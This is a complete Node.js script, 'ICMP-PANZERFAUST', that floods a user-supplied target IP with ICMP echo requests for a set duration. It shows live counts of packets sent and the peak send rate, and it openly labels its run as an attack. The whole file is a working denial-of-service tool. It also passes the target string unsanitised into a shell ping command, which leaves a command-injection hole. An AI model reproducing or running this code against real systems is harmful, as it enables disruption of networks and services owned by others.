const raw = require('raw-socket');
const { exec } = require('child_process');

if (process.argv.length !== 4) {
  console.log('Usage: node attack.js <target_ip> <duration_seconds>');
  process.exit(1);
}

const target = process.argv[2];
const durationMs = parseInt(process.argv[3], 10) * 1000;

const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

function checksum(buf) {
  let sum = 0;
  for (let i = 0; i < buf.length; i += 2) {
    sum += buf.readUInt16BE(i);
  }
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }
  return ~sum & 0xFFFF;
}

function createICMPPacket(seq) {
  const buf = Buffer.alloc(8);
  buf.writeUInt8(8, 0); // Type: Echo request
  buf.writeUInt8(0, 1); // Code
  buf.writeUInt16BE(0, 2); // Checksum placeholder
  buf.writeUInt16BE(process.pid & 0xFFFF, 4); // Identifier
  buf.writeUInt16BE(seq & 0xFFFF, 6); // Sequence number
  const csum = checksum(buf);
  buf.writeUInt16BE(csum, 2);
  return buf;
}

let sent = 0;
let success = 0;
let failed = 0;
let seq = 0;
let ppsCounter = 0;
let maxPPS = 0;

const endTime = Date.now() + durationMs;

function getPingLatency(ip, callback) {
  const platform = process.platform;
  let cmd = '';

  if (platform === 'win32') {
    cmd = `ping -n 1 ${ip}`;
  } else {
    cmd = `ping -c 1 ${ip}`;
  }

  exec(cmd, (error, stdout) => {
    if (error) {
      callback(null);
      return;
    }
    let timeMatch = null;
    if (platform === 'win32') {
      timeMatch = stdout.match(/Average = (\d+)ms/);
      if (!timeMatch) timeMatch = stdout.match(/time=(\d+)ms/);
    } else {
      timeMatch = stdout.match(/time=([\d.]+) ms/);
    }
    if (timeMatch && timeMatch[1]) {
      callback(timeMatch[1]);
    } else {
      callback(null);
    }
  });
}

// To avoid flooding memory, limit max concurrent sends inflight
const MAX_INFLIGHT = 1000;
let inflight = 0;

function flood() {
  if (Date.now() >= endTime) {
    socket.close();
    liveLog(true);
    process.exit(0);
  }
  while (inflight < MAX_INFLIGHT && Date.now() < endTime) {
    const packet = createICMPPacket(seq++);
    inflight++;
    socket.send(packet, 0, packet.length, target, (err) => {
      sent++;
      ppsCounter++;
      inflight--;
      if (err) failed++;
      else success++;
    });
  }
  // Use setImmediate to avoid blocking event loop
  setImmediate(flood);
}

function clearConsoleLines(n) {
  for (let i = 0; i < n; i++) {
    process.stdout.write('\x1b[1A'); // Move cursor up
    process.stdout.write('\x1b[2K'); // Clear entire line
  }
}

let lastLogLines = 9;
let lastLatency = 'N/A';

function liveLog(final = false) {
  const currentPPS = ppsCounter * 10; // scaled because interval is 100ms
  if (currentPPS > maxPPS) maxPPS = currentPPS;

  if (!final) {
    clearConsoleLines(lastLogLines);
  }

  process.stdout.write('ICMP-PANZERFAUST\n');
  process.stdout.write('--------------------------------------\n');
  process.stdout.write(`Success: ${success}\n`);
  process.stdout.write(`Failed: ${failed}\n`);
  process.stdout.write(`Max PPS: ${maxPPS.toFixed(2)}\n`);
  process.stdout.write(`Total sent: ${sent}\n`);
  process.stdout.write(`Target latency: ${lastLatency} ms\n`);
  process.stdout.write('--------------------------------------\n');

  ppsCounter = 0;
}

function updateLatency() {
  getPingLatency(target, (lat) => {
    lastLatency = lat !== null ? lat : 'N/A';
  });
}

// Initial header
console.log('ICMP-PANZERFAUST');
console.log('--------------------------------------');
console.log(`Target: ${target}`);
console.log(`Duration: ${durationMs / 1000}s`);
console.log('Starting attack...\n');

liveLog();

setInterval(liveLog, 100);
setInterval(updateLatency, 4000);

flood();
